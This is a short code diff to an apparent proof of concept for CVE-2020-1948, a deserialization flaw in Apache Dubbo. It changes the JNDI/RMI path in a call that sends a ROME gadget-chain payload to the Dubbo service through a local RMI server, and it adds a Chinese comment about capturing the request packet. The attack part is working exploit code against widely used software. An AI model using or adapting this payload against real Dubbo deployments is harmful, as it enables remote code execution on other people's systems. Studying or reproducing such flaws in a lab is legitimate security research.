@@ -16,6 +16,7 @@ import org.springframework.context.annotation.Bean;
  * CVE-2020-1948
  *
  * 2.5.x、[2.6.0, 2.6.7]、[2.7.0, 2.7.6]、2.7.7
+ * 抓请求包看看数据
  */
 @EnableAutoConfiguration
 public class CVE_2020_1948 {
@@ -33,6 +34,6 @@ public class CVE_2020_1948 {
 //        String result = demoService.sayHello("Whoopsunix");
 //        System.out.println(result);
 
-        demoService.sayObject(GadgetBuilder.romePayload("rmi://127.0.0.1:1099/sbm9gt"));
+        demoService.sayObject(GadgetBuilder.romePayload("rmi://127.0.0.1:1099/ruzcoc"));
     }
 }
